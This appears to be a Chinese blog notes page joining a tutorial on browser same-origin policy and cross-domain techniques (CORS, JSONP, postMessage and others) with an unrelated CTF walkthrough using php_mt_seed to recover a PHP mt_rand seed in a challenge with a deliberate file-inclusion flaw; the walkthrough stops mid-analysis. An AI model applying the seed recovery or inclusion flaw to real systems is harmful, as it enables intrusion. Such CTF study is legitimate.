<h2 id="为什么要有跨域限制"><a href="#为什么要有跨域限制" class="headerlink" title="为什么要有跨域限制"></a>为什么要有跨域限制</h2><p>因为存在浏览器同源策略，所以才会有跨域问题。那么浏览器是出于何种原因会有跨域的限制呢。其实不难想到，跨域限制主要的目的就是为了用户的上网安全。</p>
<p>如果浏览器没有同源策略，会存在什么样的安全问题呢。下面从 DOM 同源策略和 XMLHttpRequest 同源策略来举例说明：</p>
<p><strong>如果没有 DOM 同源策略，也就是说不同域的 iframe 之间可以相互访问，那么黑客可以这样进行攻击：</strong></p>
<blockquote>
<ol>
<li>做一个假网站，里面用 iframe 嵌套一个银行网站 <code>http://mybank.com</code>。</li>
<li>把 iframe 宽高啥的调整到页面全部，这样用户进来除了域名，别的部分和银行的网站没有任何差别。</li>
<li>这时如果用户输入账号密码，我们的主网站可以跨域访问到 <code>http://mybank.com</code> 的 dom 节点，就可以拿到用户的账户密码了。</li>
</ol>
</blockquote>
<p><strong>如果没有 XMLHttpRequest 同源策略，那么黑客可以进行 CSRF（跨站请求伪造） 攻击：</strong></p>
<blockquote>
<ol>
<li>用户登录了自己的银行页面 <code>http://mybank.com</code>，<code>http://mybank.com</code> 向用户的 cookie 中添加用户标识。</li>
<li>用户浏览了恶意页面 <code>http://evil.com</code>，执行了页面中的恶意 AJAX 请求代码。</li>
<li><code>http://evil.com</code> 向 <code>http://mybank.com</code> 发起 AJAX HTTP 请求，请求会默认把 <code>http://mybank.com</code> 对应 cookie 也同时发送过去。</li>
<li>银行页面从发送的 cookie 中提取用户标识，验证用户无误，response 中返回请求数据。此时数据就泄露了。</li>
<li>而且由于 Ajax 在后台执行，用户无法感知这一过程。</li>
</ol>
</blockquote>
<p>因此，有了浏览器同源策略，我们才能更安全的上网。</p>
<h2 id="跨域的解决方法"><a href="#跨域的解决方法" class="headerlink" title="跨域的解决方法"></a>跨域的解决方法</h2><p>从上面我们了解到了浏览器同源策略的作用，也正是有了跨域限制，才使我们能安全的上网。但是在实际中，有时候我们需要突破这样的限制，因此下面将介绍几种跨域的解决方法。</p>
<h2 id="CORS（跨域资源共享）"><a href="#CORS（跨域资源共享）" class="headerlink" title="CORS（跨域资源共享）"></a>CORS（跨域资源共享）</h2><blockquote>
<p>CORS（Cross-origin resource sharing，跨域资源共享）是一个 W3C 标准，定义了在必须访问跨域资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p>
<p>CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。</p>
<p>整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。</p>
<p>浏览器将CORS请求分成两类：<code>简单请求（simple request</code>）和<code>非简单请求（not-so-simple request</code>）。</p>
</blockquote>
<p>只要同时满足以下两大条件，就属于<strong>简单请求</strong>。</p>
<blockquote>
<p>1.请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>2.HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值 application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain</li>
</ul>
</blockquote>
<p>凡是不同时满足上面两个条件，就属于<strong>非简单请求</strong>。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<h3 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h3><blockquote>
<ol>
<li>在请求中需要附加一个额外的 Origin 头部，其中包含请求页面的源信息（协议、域名和端口），以便服务器根据这个头部信息来决定是否给予响应。例如：<code>Origin: http://www.laixiangran.cn</code></li>
<li>如果服务器认为这个请求可以接受，就在 Access-Control-Allow-Origin 头部中回发相同的源信息（如果是公共资源，可以回发 * ）。例如：<code>Access-Control-Allow-Origin：http://www.laixiangran.cn</code></li>
<li>没有这个头部或者有这个头部但源信息不匹配，浏览器就会驳回请求。正常情况下，浏览器会处理请求。注意，请求和响应都不包含 cookie 信息。</li>
<li>如果需要包含 cookie 信息，ajax 请求需要设置 xhr 的属性 withCredentials 为 true，服务器需要设置响应头部 <code>Access-Control-Allow-Credentials: true</code>。</li>
</ol>
</blockquote>
<h3 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h3><p>浏览器在发送真正的请求之前，会先发送一个 Preflight 请求给服务器，这种请求使用 OPTIONS 方法，发送下列头部：</p>
<blockquote>
<ul>
<li>Origin：与简单的请求相同。</li>
<li>Access-Control-Request-Method: 请求自身使用的方法。</li>
<li>Access-Control-Request-Headers: （可选）自定义的头部信息，多个头部以逗号分隔。</li>
</ul>
</blockquote>
<p>例如：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">Origin: http://www.laixiangran.cn</span></span><br><span class="line"><span class="section">Access-Control-Request-Method: POST</span></span><br><span class="line"><span class="section">Access-Control-Request-Headers: NCZ</span></span><br></pre></td></tr></table></figure>

<p>发送这个请求后，服务器可以决定是否允许这种类型的请求。服务器通过在响应中发送如下头部与浏览器进行沟通：</p>
<blockquote>
<ul>
<li>Access-Control-Allow-Origin：与简单的请求相同。</li>
<li>Access-Control-Allow-Methods: 允许的方法，多个方法以逗号分隔。</li>
<li>Access-Control-Allow-Headers: 允许的头部，多个方法以逗号分隔。</li>
<li>Access-Control-Max-Age: 应该将这个 Preflight 请求缓存多长时间（以秒表示）。</li>
</ul>
</blockquote>
<p>例如：</p>
<blockquote>
<p>Access-Control-Allow-Origin: <a href="http://www.laixiangran.cn/">http://www.laixiangran.cn</a><br>Access-Control-Allow-Methods: GET, POST<br>Access-Control-Allow-Headers: NCZ<br>Access-Control-Max-Age: 1728000</p>
</blockquote>
<p>一旦服务器通过 Preflight 请求允许该请求之后，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样了。</p>
<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><blockquote>
<ul>
<li>CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</li>
<li>支持所有类型的 HTTP 请求。</li>
</ul>
</blockquote>
<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<ul>
<li>存在兼容性问题，特别是 IE10 以下的浏览器。</li>
<li>第一次发送非简单请求时会多一次请求。</li>
</ul>
</blockquote>
<h2 id="JSONP-跨域"><a href="#JSONP-跨域" class="headerlink" title="JSONP 跨域"></a>JSONP 跨域</h2><blockquote>
<p>由于 <code>script</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。因此可以通过动态创建 script 标签，然后利用 src 属性进行跨域，这也就是 JSONP 跨域的基本原理。</p>
</blockquote>
<p>直接通过下面的例子来说明 JSONP 实现跨域的流程：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">// 1. 定义一个 回调函数 handleResponse 用来接收返回的数据</span><br><span class="line">function handleResponse(data) &#123;</span><br><span class="line">    console.log(data)<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 2. 动态创建一个 script 标签，并且告诉后端回调函数名叫 handleResponse</span><br><span class="line">var <span class="attr">body</span> = document.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">var <span class="attr">script</span> = document.gerElement(<span class="string">&#x27;script&#x27;</span>)<span class="comment">;</span></span><br><span class="line"><span class="attr">script.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/json?callback=handleResponse&#x27;</span><span class="comment">;</span></span><br><span class="line">body.appendChild(script)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 3. 通过 script.src 请求 `http://www.laixiangran.cn/json?<span class="attr">callback</span>=handleResponse`，</span><br><span class="line">// 4. 后端能够识别这样的 URL 格式并处理该请求，然后返回 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 给浏览器</span><br><span class="line">// 5. 浏览器在接收到 handleResponse(&#123;&quot;name&quot;: &quot;laixiangran&quot;&#125;) 之后立即执行 ，也就是执行 handleResponse 方法，获得后端返回的数据，这样就完成一次跨域请求了。</span><br></pre></td></tr></table></figure>

<h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><blockquote>
<ul>
<li>使用简便，没有兼容性问题，目前最流行的一种跨域方法。</li>
</ul>
</blockquote>
<h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<ul>
<li>只支持 GET 请求。</li>
<li>由于是从其它域中加载代码执行，因此如果其他域不安全，很可能会在响应中夹带一些恶意代码。</li>
<li>要确定 JSONP 请求是否失败并不容易。虽然 HTML5 给 script 标签新增了一个 onerror 事件处理程序，但是存在兼容性问题。</li>
</ul>
</blockquote>
<h2 id="图像-Ping-跨域"><a href="#图像-Ping-跨域" class="headerlink" title="图像 Ping 跨域"></a>图像 Ping 跨域</h2><blockquote>
<p>由于 <code>img</code> 标签不受浏览器同源策略的影响，允许跨域引用资源。</p>
<p>因此可以通过 img 标签的 src 属性进行跨域，这也就是图像 Ping 跨域的基本原理。</p>
</blockquote>
<p>直接通过下面的例子来说明图像 Ping 实现跨域的流程：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">var <span class="attr">img</span> = new Image()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">// 通过 onload 及 onerror 事件可以知道响应是什么时候接收到的，但是不能获取响应文本</span><br><span class="line"><span class="attr">img.onload</span> = img.<span class="literal">on</span>error = function() &#123;</span><br><span class="line">    console.log(&quot;Done!&quot;)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 请求数据通过查询字符串形式发送</span><br><span class="line"><span class="attr">img.src</span> = <span class="string">&#x27;http://www.laixiangran.cn/test?name=laixiangran&#x27;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h3 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h3><blockquote>
<ul>
<li>用于实现跟踪用户点击页面或动态广告曝光次数有较大的优势。</li>
</ul>
</blockquote>
<h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><blockquote>
<ul>
<li>只支持 GET 请求。</li>
<li>只能浏览器与服务器的单向通信，因为浏览器不能访问服务器的响应文本。</li>
</ul>
</blockquote>
<h2 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h2><blockquote>
<p>浏览器有跨域限制，但是服务器不存在跨域问题，所以可以由服务器请求所有域的资源再返回给客户端。</p>
<p>**<u>服务器代理是万能的</u>**。</p>
</blockquote>
<h2 id="document-domain-跨域"><a href="#document-domain-跨域" class="headerlink" title="document.domain 跨域"></a>document.domain 跨域</h2><blockquote>
<p>对于主域名相同，而子域名不同的情况，可以使用 document.domain 来跨域。这种方式非常适用于 iframe 跨域的情况。</p>
</blockquote>
<p>比如，</p>
<p>有一个页面，它的地址是 <code>http://www.laixiangran.cn/a.html</code>，在这个页面里面有一个 iframe，它的 src 是 <code>http://laixiangran.cn/b.html</code>。</p>
<blockquote>
<p>很显然，这个页面与它里面的 iframe 框架是不同域的，所以我们是无法通过在页面中书写 js 代码来获取 iframe 中的东西的。</p>
<p>这个时候，document.domain 就可以派上用场了，我们只要把 <code>http://www.laixiangran.cn/a.html</code> 和 <code>http://laixiangran.cn/b.html</code> 这两个页面的 document.domain 都设成相同的域名就可以了。但要注意的是，document.domain 的设置是有限制的，我们只能把 document.domain 设置成自身或更高一级的父域，且主域必须相同。例如：<code>a.b.laixiangran.cn</code> 中某个文档的 document.domain 可以设成 <code>a.b.laixiangran.cn</code>、<code>b.laixiangran.cn</code> 、<code>laixiangran.cn</code> 中的任意一个，但是不可以设成 <code>c.a.b.laixiangran.cn</code> ，因为这是当前域的子域，也不可以设成 <code>baidu.com</code>，因为主域已经不相同了。</p>
</blockquote>
<p>例如，在页面 <code>http://www.laixiangran.cn/a.html</code> 中设置document.domain：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// 设置成主域</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>).<span class="property">contentWindow</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在页面 <code>http://laixiangran.cn/b.html</code> 中也设置 document.domain，而且这也是必须的，虽然这个文档的 domain 就是 <code>laixiangran.cn</code>，但是还是必须显式地设置 document.domain 的值：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&#x27;laixiangran.cn&#x27;</span>; <span class="comment">// document.domain 设置成与主页面相同</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样，<code>http://www.laixiangran.cn/a.html</code> 就可以通过 js 访问到 <code>http://laixiangran.cn/b.html</code> 中的各种属性和对象了。</p>
<h2 id="window-name-跨域"><a href="#window-name-跨域" class="headerlink" title="window.name 跨域"></a><a href="https://link.juejin.cn/?target=http://window.name">window.name</a> 跨域</h2><blockquote>
<p>window 对象有个 name 属性，该属性有个特征：即在一个窗口（window）的生命周期内，窗口载入的所有的页面（不管是相同域的页面还是不同域的页面）都是共享一个 <code>window.name</code> 的，每个页面对 <code>window.name</code> 都有读写的权限，<code>window.name</code> 是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
</blockquote>
<p>通过下面的例子介绍如何通过 <a href="https://link.juejin.cn/?target=http://window.name">window.name</a> 来跨域获取数据的。</p>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 重置 iframe 的 onload 事件程序，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 此时经过后面代码重置 src 之后，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// http://www.laixiangran.cn/a.html 页面与该 iframe 在同一个源了，可以相互访问了</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> data = iframe.<span class="property">contentWindow</span>.<span class="property">name</span>; <span class="comment">// 4. 获取 iframe 里的 window.name</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// hello world!</span></span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. 重置一个与 http://www.laixiangran.cn/a.html 页面同源的页面</span></span></span><br><span class="line"><span class="language-javascript">        iframe.<span class="property">src</span> = <span class="string">&#x27;http://www.laixiangran.cn/c.html&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. 给当前的 window.name 设置一个 http://www.laixiangran.cn/a.html 页面想要得到的数据值 </span><br><span class="line">    <span class="attr">window.name</span> = <span class="string">&quot;hello world!&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="location-hash-跨域"><a href="#location-hash-跨域" class="headerlink" title="location.hash 跨域"></a>location.hash 跨域</h2><blockquote>
<p>location.hash 方式跨域，是子框架修改父框架 src 的 hash 值，通过这个属性进行传递数据，且更改 hash 值，页面不会刷新。但是传递的数据的字节数是有限的。</p>
</blockquote>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 2. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 3. 获取通过 http://laixiangran.cn/b.html 页面设置 hash 值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> data = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">&lt;script <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    // 1. 设置父页面的 hash 值</span><br><span class="line">    <span class="attr">parent.location.hash</span> = <span class="string">&quot;world&quot;</span><span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="postMessage-跨域"><a href="#postMessage-跨域" class="headerlink" title="postMessage 跨域"></a>postMessage 跨域</h2><blockquote>
<p>window.postMessage(message，targetOrigin) 方法是 HTML5 新引进的特性，可以使用它来向其它的 window 对象发送消息，无论这个 window 对象是属于同源或不同源。这个应该就是以后解决 dom 跨域通用方法了。</p>
<p>调用 postMessage 方法的 window 对象是指要接收消息的那一个 window 对象，该方法的第一个参数 message 为要发送的消息，类型只能为字符串；第二个参数 targetOrigin 用来限定接收消息的那个 window 对象所在的域，如果不想限定域，可以使用通配符 *。</p>
<p>需要接收消息的 window 对象，可是通过监听自身的 message 事件来获取传过来的消息，消息内容储存在该事件对象的 data 属性中。</p>
</blockquote>
<p>页面 <code>http://www.laixiangran.cn/a.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://laixiangran.cn/b.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;myIframe&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;test()&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 1. iframe载入 &quot;http://laixiangran.cn/b.html 页面后会执行该函数</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 2. 获取 http://laixiangran.cn/b.html 页面的 window 对象，</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 然后通过 postMessage 向 http://laixiangran.cn/b.html 页面发送消息</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myIframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> win = iframe.<span class="property">contentWindow</span>;</span></span><br><span class="line"><span class="language-javascript">        win.<span class="title function_">postMessage</span>(<span class="string">&#x27;我是来自 http://www.laixiangran.cn/a.html 页面的消息&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>页面 <code>http://laixiangran.cn/b.html</code> 的代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 注册 message 事件用来接收消息</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        e = e || event; <span class="comment">// 获取事件对象</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">data</span>); <span class="comment">// 通过 data 属性得到发送来的消息</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
<ul>
<li><a href="https://link.juejin.cn/?target=https://www.cnblogs.com/2050/p/3191744.html">js中几种实用的跨域方法原理详解</a></li>
<li><a href="https://link.juejin.cn/?target=https://zhuanlan.zhihu.com/p/28562290">跨域的那些事儿</a></li>
<li><a href="https://link.juejin.cn/?target=http://www.ruanyifeng.com/blog/2016/04/cors.html">跨域资源共享 CORS 详解</a></li>
</ul>
</blockquote>
<h1 id="16-seed工具php-mt-seed"><a href="#16-seed工具php-mt-seed" class="headerlink" title="16.seed工具php_mt_seed"></a>16.seed工具php_mt_seed</h1><p>这里以一道题为例子讲解这个工具的使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;seed.php&quot;</span>);</span><br><span class="line"><span class="comment">//mt_srand(*********);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hint: &quot;</span>.<span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/base|\.\./i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/NewStar/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="comment">//flag in `flag.php`</span></span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Baby Hacker?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No Hacker!&quot;</span>;</span><br><span class="line">&#125; Hint: <span class="number">1219893521</span></span><br><span class="line">No Hacker!</span><br></pre></td></tr></table></figure>

<hr>
<p>搜索这两个函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mt_scrand</span>()</span><br><span class="line"><span class="title function_ invoke__">mt_rand</span>()  </span><br></pre></td></tr></table></figure>

<p><code>mt_scrand(seed)</code>这个函数的意思，是通过分发<code>seed</code>种子，然后种子有了后，靠<code>mt_rand()</code>生成随机数。</p>
<p>我们来写段代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>我们访问，输出<code>162946439</code>。</p>
<p>现在代码改为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">12345</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>    </span><br></pre></td></tr></table></figure>

<p>我们再次访问:</p>
<blockquote>
<p>162946439</p>
<p>247161732</p>
<p>1463094264</p>
<p>1878061366</p>
<p>394962642</p>
</blockquote>
<p>发现<code>162946439</code>又出现了</p>
<blockquote>
<p>所以可以推断出随机数其实是可预测的，</p>
<p>它以一种线性的方式生成</p>
<p>知道种子和一组伪随机数不是就可以推y(伪随机数了吗),当然实际上更复杂肯定。</p>
<p>我知道种子后，可以确定你输出伪随机数的序列。<br>知道你的随机数序列，可以确定你的种子。 </p>
</blockquote>
<p>在我们的例题中，我们并不知道我们的种子是多少</p>
<p>但是它给出了我们种子的第一个随机数<code>1219893521</code></p>
<p>这个时候想要拿到种子的值，就需要大量反向的演算推导了</p>
<p>这个过程很庞大，所以这里就用到了工具【脚本】<code>php_mt_seed</code></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">time</span> ./php_mt_seed 第一个随机数  </span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/31/daily/image-20221120141340099.png" alt="image-20221120141340099"></p>
<p>于是我们就得到了我们的<code>seed</code></p>
<blockquote>
<p>1145146</p>
</blockquote>
<p>再分析源码</p>
